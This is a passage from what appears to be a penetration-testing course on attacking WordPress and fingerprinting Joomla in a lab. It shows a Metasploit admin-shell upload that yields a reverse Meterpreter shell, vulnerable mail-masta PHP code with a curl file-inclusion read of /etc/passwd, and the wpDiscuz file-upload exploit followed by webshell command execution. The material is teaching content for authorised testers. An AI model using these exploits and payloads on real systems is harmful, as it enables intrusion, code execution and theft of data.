   SSL        <span class="hljs-literal">false</span>                     no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
   TARGETURI  /                         yes       The base path <span class="hljs-keyword">to</span> the wordpress application
   USERNAME   john                      yes       The WordPress username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   <span class="hljs-comment">----   ---------------  --------  -----------</span>
   LHOST  <span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>      yes       The listen address (an interface may be specified)
   LPORT  <span class="hljs-number">4444</span>             yes       The listen <span class="hljs-keyword">port</span>


Exploit target:

   Id  Name
   <span class="hljs-comment">--  ----</span>
   <span class="hljs-number">0</span>   WordPress
</code></pre>
<p>Once we are satisfied with the setup, we can type <code>exploit</code> and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">msf6</span> <span class="hljs-selector-tag">exploit</span>(unix/webapp/wp_admin_shell_upload) &gt; <span class="hljs-selector-tag">exploit</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.15</span><span class="hljs-selector-pseudo">:4444</span> 
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Authenticating</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">WordPress</span> <span class="hljs-selector-tag">using</span> <span class="hljs-selector-tag">doug</span><span class="hljs-selector-pseudo">:jessica1...</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Authenticated</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">WordPress</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Preparing</span> <span class="hljs-selector-tag">payload</span>...
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Uploading</span> <span class="hljs-selector-tag">payload</span>...
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Executing</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">payload</span> <span class="hljs-selector-tag">at</span> /<span class="hljs-selector-tag">wp-content</span>/<span class="hljs-selector-tag">plugins</span>/<span class="hljs-selector-tag">CczIptSXlr</span>/<span class="hljs-selector-tag">wCoUuUPfIO</span><span class="hljs-selector-class">.php</span>...
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (<span class="hljs-number">39264</span> bytes) <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.42</span><span class="hljs-selector-class">.195</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">opened</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>:<span class="hljs-number">42816</span>) <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">2021-09-20</span> <span class="hljs-selector-tag">19</span><span class="hljs-selector-pseudo">:43</span><span class="hljs-selector-pseudo">:46</span> <span class="hljs-selector-tag">-0400</span>
<span class="hljs-selector-tag">i</span><span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Deleted</span> <span class="hljs-selector-tag">wCoUuUPfIO</span><span class="hljs-selector-class">.php</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Deleted</span> <span class="hljs-selector-tag">CczIptSXlr</span><span class="hljs-selector-class">.php</span>
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Deleted</span> ../<span class="hljs-selector-tag">CczIptSXlr</span>

<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">getuid</span>

<span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">username</span>: <span class="hljs-selector-tag">www-data</span> (<span class="hljs-number">33</span>)
</code></pre>
<p>In the above example, the Metasploit module uploaded the <code>wCoUuUPfIO.php</code> file to the <code>/wp-content/plugins</code> directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information—more on this in a later module.</p>
<ul>
<li>Exploited systems (hostname/IP and method of exploitation)</li>
<li>Compromised users (account name, method of compromise, account type (local or domain))</li>
<li>Artifacts created on systems</li>
<li>Changes (such as adding a local admin user or modifying group membership)</li>
</ul>
<hr>
<h3 id="leveraging-known-vulnerabilities">Leveraging Known Vulnerabilities</h3>
<p>Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the vast majority of them can be found in plugins. According to the WordPress Vulnerability Statistics page hosted <a href="https://wpscan.com/statistics">here</a>, at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:</p>
<ul>
<li>4% WordPress core</li>
<li>89% plugins</li>
<li>7% themes</li>
</ul>
<p>The number of vulnerabilities related to WordPress has grown steadily since 2014, likely due to the sheer amount of free (and paid) themes and plugins available, with more and more being added every week. For this reason, we must be extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.</p>
<p>Note: We can use the <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a> tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.</p>
<p><strong>Vulnerable Plugins - mail-masta</strong></p>
<p>Let&#39;s look at a few examples. The plugin <a href="https://wordpress.org/plugins/mail-masta/">mail-masta</a> is no longer supported but has had over 2,300 <a href="https://wordpress.org/plugins/mail-masta/advanced/">downloads</a> over the years. It&#39;s not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an <a href="https://www.exploit-db.com/exploits/41438">unauthenticated SQL injection</a> and a <a href="https://www.exploit-db.com/exploits/50226">Local File Inclusion</a>.</p>
<p>Let&#39;s take a look at the vulnerable code for the mail-masta plugin.</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> 

<span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">'pl'</span>]);
<span class="hljs-keyword">global</span> $wpdb;

$camp_id=$_POST[<span class="hljs-string">'camp_id'</span>];
$masta_reports = $wpdb-&gt;prefix . <span class="hljs-string">"masta_reports"</span>;
$count=$wpdb-&gt;get_results(<span class="hljs-string">"SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1"</span>);

<span class="hljs-keyword">echo</span> $count[<span class="hljs-number">0</span>]-&gt;co;

<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>As we can see, the <code>pl</code> parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let&#39;s exploit this to retrieve the contents of the <code>/etc/passwd</code> file using <code>cURL</code>.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/blog.inlanefreight.local/wp</span>-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<span class="hljs-regexp">/etc/passwd</span>

<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">tss:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span><span class="hljs-symbol">:TPM</span> software stack,,,<span class="hljs-symbol">:/var/lib/tpm</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">landscape:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">115</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/landscape</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> Core <span class="hljs-symbol">Dumper:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">ubuntu:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:ubuntu</span><span class="hljs-symbol">:/home/ubuntu</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/snap/lxd/common/lxd</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">usbmux:</span><span class="hljs-symbol">x:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-number">46</span><span class="hljs-symbol">:usbmux</span> daemon,,,<span class="hljs-symbol">:/var/lib/usbmux</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">113</span><span class="hljs-symbol">:</span><span class="hljs-number">119</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
</code></pre>
<p><strong>Vulnerable Plugins - wpDiscuz</strong></p>
<p><a href="https://wpdiscuz.com/">wpDiscuz</a> is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over <a href="https://wordpress.org/plugins/wpdiscuz/advanced/">1.6 million downloads</a> and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this <a href="https://www.exploit-db.com/exploits/49967">exploit</a> has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found <a href="https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/">here</a>.</p>
<p>The exploit script takes two parameters: <code>-u</code> the URL and <code>-p</code> the path to a valid post.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=<span class="hljs-number">1</span>

---------------------------------------------------------------
[-] <span class="hljs-symbol">Wordpress</span> <span class="hljs-symbol">Plugin</span> wpDiscuz <span class="hljs-number">7.0</span><span class="hljs-number">.4</span> - <span class="hljs-symbol">Remote</span> <span class="hljs-symbol">Code</span> <span class="hljs-symbol">Execution</span>
[-] <span class="hljs-symbol">File</span> <span class="hljs-symbol">Upload</span> <span class="hljs-symbol">Bypass</span> <span class="hljs-symbol">Vulnerability</span> - <span class="hljs-symbol">PHP</span> <span class="hljs-symbol">Webshell</span> <span class="hljs-symbol">Upload</span>
[-] <span class="hljs-symbol">CVE</span>: <span class="hljs-symbol">CVE</span><span class="hljs-number">-2020</span><span class="hljs-number">-24186</span>
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] <span class="hljs-symbol">Response</span> length:[<span class="hljs-number">102476</span>] | code:[<span class="hljs-number">200</span>]
[!] <span class="hljs-symbol">Got</span> wmuSecurity value: <span class="hljs-number">5</span>c9398fcdb
[!] <span class="hljs-symbol">Got</span> wmuSecurity value: <span class="hljs-number">1</span> 

[+] <span class="hljs-symbol">Generating</span> random name for <span class="hljs-symbol">Webshell</span>...
[!] <span class="hljs-symbol">Generated</span> webshell name: uthsdkbywoxeebg

[!] <span class="hljs-symbol">Trying</span> to <span class="hljs-symbol">Upload</span> <span class="hljs-symbol">Webshell</span>..
[+] <span class="hljs-symbol">Upload</span> <span class="hljs-symbol">Success</span>... <span class="hljs-symbol">Webshell</span> path:url&amp;quot;:&amp;quot;http://blog.inlanefreight.local/wp-content/uploads/<span class="hljs-number">2021</span>/<span class="hljs-number">08</span>/uthsdkbywoxeebg<span class="hljs-number">-1629904090.8191</span>.php&amp;quot; 

&gt; id

[x] <span class="hljs-symbol">Failed</span> to execute <span class="hljs-symbol">PHP</span> code...
</code></pre>
<p>The exploit as written may fail, but we can use <code>cURL</code> to execute commands using the uploaded web shell. We just need to append <code>?cmd=</code> after the <code>.php</code> extension to run commands which we can see in the exploit script.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/blog.inlanefreight.local/</span>wp-content<span class="hljs-regexp">/uploads/</span><span class="hljs-number">2021</span><span class="hljs-regexp">/08/</span>uthsdkbywoxeebg<span class="hljs-number">-1629904090.8191</span>.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>In this example, we would want to make sure to clean up the <code>uthsdkbywoxeebg-1629904090.8191.php</code> file and once again list it as a testing artifact in the appendices of our report.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>As we have seen from the last two sections, WordPress presents a vast attack surface. During our careers as penetration testers, we will almost definitely encounter WordPress many times. We must have the skills to quickly footprint a WordPress installation and perform thorough manual and tool-based enumeration to uncover high-risk misconfigurations and vulnerabilities. If these sections on WordPress were interesting, check out the <a href="https://academy.hackthebox.com/course/preview/hacking-wordpress">Attacking WordPress module</a> for more practice.</p>
<h2 id="joomla-discovery-enumeration">Joomla - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://www.joomla.org/">Joomla</a>, released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates. There are up to 2.5 million sites on the internet running Joomla. Here are some interesting <a href="https://websitebuilder.org/blog/joomla-statistics/">statistics</a> about Joomla:</p>
<ul>
<li>Joomla accounts for 3.5% of the CMS market share</li>
<li>Joomla is 100% free and means &quot;all together&quot; in Swahili (phonetic spelling of &quot;Jumla&quot;)</li>
<li>The Joomla community has close to 700,000 in its online forums</li>
<li>Joomla powers 3% of all websites on the internet, nearly 25,000 of the top 1 million sites worldwide (just 10% of the reach of WordPress)</li>
<li>Some notable organizations that use Joomla include eBay, Yamaha, Harvard University, and the UK government</li>
<li>Over the years, 770 different developers have contributed to Joomla</li>
</ul>
<p>Joomla collects some anonymous <a href="https://developer.joomla.org/about/stats.html">usage statistics</a> such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public <a href="https://developer.joomla.org/about/stats/api.html">API</a>.</p>
<p>Querying this API, we can see over 2.7 million Joomla installs!</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s https:/</span><span class="hljs-regexp">/developer.joomla.org/</span>stats/cms_version | python3 -m json.tool

{
    <span class="hljs-string">"data"</span>: {
        <span class="hljs-string">"cms_version"</span>: {
            <span class="hljs-string">"3.0"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"3.1"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"3.10"</span>: <span class="hljs-number">3.49</span>,
            <span class="hljs-string">"3.2"</span>: <span class="hljs-number">0.01</span>,
            <span class="hljs-string">"3.3"</span>: <span class="hljs-number">0.02</span>,
            <span class="hljs-string">"3.4"</span>: <span class="hljs-number">0.05</span>,
            <span class="hljs-string">"3.5"</span>: <span class="hljs-number">13</span>,
            <span class="hljs-string">"3.6"</span>: <span class="hljs-number">24.29</span>,
            <span class="hljs-string">"3.7"</span>: <span class="hljs-number">8.5</span>,
            <span class="hljs-string">"3.8"</span>: <span class="hljs-number">18.84</span>,
            <span class="hljs-string">"3.9"</span>: <span class="hljs-number">30.28</span>,
            <span class="hljs-string">"4.0"</span>: <span class="hljs-number">1.52</span>,
            <span class="hljs-string">"4.1"</span>: <span class="hljs-number">0</span>
        },
        <span class="hljs-string">"total"</span>: <span class="hljs-number">2776276</span>
    }
}
</code></pre>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>Let&#39;s assume that we come across an e-commerce site during an external penetration test. At first glance, we are not exactly sure what is running, but it does not appear to be fully custom. If we can fingerprint what the site is running on, we may be able to uncover vulnerabilities or misconfigurations. Based on the limited information, we assume that the site is running Joomla, but we must confirm that fact and then figure out the version number and other information such as installed themes and plugins.</p>
<p>We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span> | grep Joomla

    &lt;meta name=<span class="hljs-string">"generator"</span> content=<span class="hljs-string">"Joomla! - Open Source Content Management"</span> /&gt;


&lt;SNIP&gt;
</code></pre>
<p>The <code>robots.txt</code> file for a Joomla site will often look like this:</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session"><span class="hljs-meta"># If the Joomla site is installed within a folder</span>
<span class="hljs-meta"># eg www.example.com/joomla/ then the robots.txt file</span>
<span class="hljs-meta"># MUST be moved to the site root</span>
<span class="hljs-meta"># eg www.example.com/robots.txt</span>
<span class="hljs-meta"># AND the joomla folder name MUST be prefixed to all of the</span>
<span class="hljs-meta"># paths.</span>
<span class="hljs-meta"># eg the Disallow rule for the /administrator/ folder MUST</span>
<span class="hljs-meta"># be changed to read</span>
<span class="hljs-meta"># Disallow: /joomla/administrator/</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># For more information about the robots.txt standard, see:</span>
<span class="hljs-meta"># https:<span class="hljs-comment">//www.robotstxt.org/orig.html</span></span>

User-agent: *
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/administrator/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/bin/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/cache/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/cli/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/components/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/includes/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/installation/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/language/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/layouts/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/libraries/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/logs/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/modules/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/plugins/</span>
<span class="hljs-symbol">Disallow:</span> <span class="hljs-meta-keyword">/tmp/</span>
</code></pre>
<p>We can also often see the telltale Joomla favicon (but not always). We can fingerprint the Joomla version if the <code>README.txt</code> file is present.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>README.txt | head -n <span class="hljs-number">5</span>

<span class="hljs-number">1</span>- What is <span class="hljs-keyword">this</span>?
    * This is a Joomla! installation/upgrade package to version 3.x
    * Joomla! Official site: <span class="hljs-string">https:</span><span class="hljs-comment">//www.joomla.org</span>
    * Joomla! <span class="hljs-number">3.9</span> version history - <span class="hljs-string">https:</span><span class="hljs-comment">//docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history</span>
    * Detailed changes <span class="hljs-keyword">in</span> the <span class="hljs-string">Changelog:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/joomla/joomla-cms/commits/staging</span>
</code></pre>
<p>In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the <code>media/system/js/</code> directory or by browsing to <code>administrator/manifests/files/joomla.xml</code>.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">extension</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"3.6"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"upgrade"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>files_joomla<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Joomla! Project<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
